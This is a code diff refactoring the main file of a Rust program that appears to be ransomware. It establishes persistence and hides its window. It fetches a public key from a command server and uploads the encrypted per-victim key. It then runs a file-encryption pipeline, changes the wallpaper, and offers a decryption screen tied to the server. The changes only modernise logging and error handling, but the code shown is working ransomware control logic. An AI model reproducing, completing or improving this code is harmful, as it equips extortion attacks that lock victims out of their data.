@@ -3,20 +3,24 @@
     windows_subsystem = "windows"
 )]
 
-use hex::encode;
-use log::{debug, error, info};
 use std::{path::Path, process::ExitCode, sync::Arc};
-use zeroize::{Zeroize, Zeroizing};
 
-use coconut_crab_lib::{file::get_exe_path_dir, web::codes::RECOVERY_REQUEST_CODE};
+use anyhow::Context;
+use coconut_crab_lib::{
+    file::current_exe_dir,
+    web::{codes::RECOVERY_REQUEST_CODE, types::EncryptedSymKey},
+};
+use hex::encode;
+use purecrypto::zeroize::{Zeroize, Zeroizing};
+use tracing::{debug, error, info};
 
 mod canary;
 mod client;
-use client::{get_thread_counts, initialize_client};
+use client::{initialize_client, thread_counts};
 
 mod comm;
 use comm::{
-    ServerConn, download_asym_pub_key, get_sym_key, upload_sym_key, write_asym_pub_key_to_disk,
+    ServerConn, download_asym_pub_key, fetch_sym_key, upload_sym_key, write_asym_pub_key_to_disk,
 };
 
 mod config;
@@ -53,42 +57,45 @@ use_litcrypt!();
 slint::include_modules!();
 
 fn main() -> ExitCode {
-    let default_level = if cfg!(debug_assertions) {
+    let default_filter = if cfg!(debug_assertions) {
         "info"
     } else {
         "off"
     };
-    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or(default_level))
+    tracing_subscriber::fmt()
+        .with_env_filter(
+            tracing_subscriber::EnvFilter::try_from_default_env()
+                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new(default_filter)),
+        )
         .init();
 
     match run() {
         Ok(()) => ExitCode::SUCCESS,
         Err(error) => {
-            error!("Fatal error: {error}");
+            error!(error = ?error, "Fatal error");
             ExitCode::FAILURE
         }
     }
 }
 
-fn run() -> Result<(), String> {
-    let preshared_secret = config::PRESHARED_SECRET.as_str();
+fn run() -> anyhow::Result<()> {
+    let preshared_secret: &'static str = config::PRESHARED_SECRET.as_str();
     let conn = ServerConn::from_config();
 
     if config::PERSIST {
         debug!("Establishing persistence");
         if let Err(error) = start_persist() {
-            error!("Failed to establish persistence: {error}");
+            error!(error = ?error, "Failed to establish persistence");
         }
     }
 
-    let exe_path_dir = get_exe_path_dir()
-        .map_err(|error| format!("Cannot determine executable directory: {error}"))?;
+    let exe_path_dir = current_exe_dir().context("cannot determine executable directory")?;
     let mut status = initialize_client(&exe_path_dir, &conn, preshared_secret)?;
-    let thread_counts = get_thread_counts();
+    let thread_counts = thread_counts();
 
     let mut sym_key = Zeroizing::new([0u8; 32]);
 
-    if !status.encryption_complete {
+    if !status.state.is_complete() {
         setup_encryption_keys(
             &mut status,
             &mut sym_key,
@@ -104,7 +111,7 @@ fn run() -> Result<(), String> {
     let exe_path_dir_arc = Arc::new(exe_path_dir);
     let aad_arc: Arc<[u8]> = Arc::from(status.encryption_aad.as_bytes());
 
-    if !status.encryption_complete {
+    if !status.state.is_complete() {
         run_encryption_pipeline(EncryptionPipeline {
             status: &mut status,
             sym_key: &sym_key_arc,
@@ -120,21 +127,22 @@ fn run() -> Result<(), String> {
         set_icon_wallpaper();
     }
 
-    let ui = Main::new().expect("Failed to create Slint UI");
+    let ui = Main::new().context("failed to create Slint UI")?;
     callback_handler_init(&ui);
 
     let decrypt_requests = spawn_decryption_handler(
         &ui,
         DecryptConfig {
-            status: status.clone(),
+            status,
             conn: conn.clone(),
-            preshared_secret: preshared_secret.to_string(),
+            preshared_secret,
             encrypted_extension: Arc::clone(&encrypted_extension),
             walk_threads: thread_counts.walk,
             decrypt_threads: thread_counts.decrypt,
             persist: config::PERSIST,
         },
-    );
+    )
+    .context("failed to spawn decryption handler")?;
 
     let ui_handle = ui.as_weak();
     ui.on_try_decrypt(move || {
@@ -155,7 +163,7 @@ fn run() -> Result<(), String> {
         }
     });
 
-    ui.run().expect("Failed to run Slint UI");
+    ui.run().context("failed to run Slint UI")?;
     Ok(())
 }
 
@@ -165,45 +173,49 @@ fn setup_encryption_keys(
     exe_path_dir: &Path,
     conn: &ServerConn,
     preshared_secret: &str,
-) -> Result<(), String> {
+) -> anyhow::Result<()> {
     debug!("Encryption not previously completed");
 
-    if status.encryption_started {
+    if status.state.is_started() {
         debug!("Encryption previously started; retrieving key");
-        let key = get_sym_key(conn, status, RECOVERY_REQUEST_CODE, preshared_secret)
-            .map_err(|error| format!("Unable to retrieve symmetric key from server: {error}"))?;
+        let key = fetch_sym_key(conn, status, RECOVERY_REQUEST_CODE, preshared_secret)
+            .context("unable to retrieve symmetric key from server")?;
         **sym_key = *key;
     } else {
         debug!("Encryption not previously started");
         **sym_key = generate_sym_key();
 
-        let asym_pub_key = download_asym_pub_key(conn)
-            .map_err(|error| format!("Unable to download public key: {error}"))?;
+        let asym_pub_key = download_asym_pub_key(conn).context("unable to download public key")?;
 
         if config::SAVE_PUBLIC_KEY_TO_DISK {
-            write_asym_pub_key_to_disk(&asym_pub_key, &exe_path_dir.join("asym-pub-key.pem"))?;
+            write_asym_pub_key_to_disk(&asym_pub_key, &exe_path_dir.join("asym-pub-key.pem"))
+                .context("failed to write public key to disk")?;
         }
 
-        status.asymmetrically_encrypted_symmetric_key =
-            match encrypt_sym_key(&asym_pub_key, sym_key) {
-                Ok(encrypted) => encode(encrypted),
-                Err(error) => {
-                    sym_key.zeroize();
-                    let _ = export_status_csv(exe_path_dir, status);
-                    return Err(format!("{error}; exiting without marking complete"));
+        let encrypted = match encrypt_sym_key(&asym_pub_key, sym_key) {
+            Ok(encrypted) => encrypted,
+            Err(error) => {
+                sym_key.zeroize();
+                if let Err(export_error) = export_status_csv(exe_path_dir, status) {
+                    error!(error = ?export_error, "Failed to export status CSV");
                 }
-            };
+                return Err(error.context("exiting without marking complete"));
+            }
+        };
+        status.asymmetrically_encrypted_symmetric_key = EncryptedSymKey::new(encode(encrypted));
 
-        upload_sym_key(conn, status, preshared_secret).map_err(|error| {
+        if let Err(error) = upload_sym_key(conn, status, preshared_secret) {
             sym_key.zeroize();
-            let _ = export_status_csv(exe_path_dir, status);
-            format!("Failed to upload symmetric key: {error}")
-        })?;
+            if let Err(export_error) = export_status_csv(exe_path_dir, status) {
+                error!(error = ?export_error, "Failed to export status CSV");
+            }
+            return Err(error.context("failed to upload symmetric key"));
+        }
 
         let full_nonce_bytes = generate_nonce();
         status.symmetrically_encrypted_id_nonce = encode(full_nonce_bytes);
         let (id_ciphertext, id_tag) = encrypt_string(
-            &status.id,
+            status.id.as_str(),
             sym_key,
             &full_nonce_bytes,
             status.encryption_aad.as_bytes(),
@@ -212,7 +224,6 @@ fn setup_encryption_keys(
         status.symmetrically_encrypted_id_tag = encode(id_tag);
     }
 
-    export_status_csv(exe_path_dir, status)
-        .map_err(|error| format!("Failed to update status CSV: {error}"))?;
+    export_status_csv(exe_path_dir, status).context("failed to update status CSV")?;
     Ok(())
 }
